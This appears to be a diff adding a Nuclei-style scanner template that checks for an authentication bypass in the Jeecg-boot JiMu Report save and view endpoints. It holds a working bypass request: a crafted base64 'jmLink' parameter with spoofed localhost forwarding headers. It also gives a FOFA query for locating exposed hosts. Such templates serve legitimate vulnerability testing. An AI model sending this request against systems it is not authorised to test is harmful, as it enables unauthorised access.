@@ -1,0 +1,38 @@
+id: jeecg-boot-jimureport-auth-bypass
+
+info:
+  name: Jeecg-boot JiMu Report Authentication Bypass
+  author: Co5mos
+  severity: high
+  description: |
+    Jeecg-boot JiMu Report system's `save` endpoint has an authentication bypass vulnerability that allows attackers to bypass token restrictions using a specially crafted `jmLink` parameter.
+  metadata:
+    verified: true
+    fofa-query: app="JeecgBoot-企业级低代码平台"
+  tags: jeecg, jimureport, auth, bypass
+
+http:
+  - raw:
+      - |
+        POST {{path}}?previousPage=xxx&jmLink=YWFhfHxiYmI= HTTP/1.1
+        Host: {{Hostname}}
+        Content-type: application/json
+        x-forwarded-for: 127.0.0.1
+        x-forwarded: 127.0.0.1
+        x-forward-for: 127.0.0.1
+
+        {}
+
+    payloads:
+      path:
+        - /jeecg-boot/jmreport/save
+        - /jeecg-boot/jmreport/view
+
+    stop-at-first-match: true
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(body, '\"success\":true')
+          - contains(body, 'apiMethod')
+        condition: and
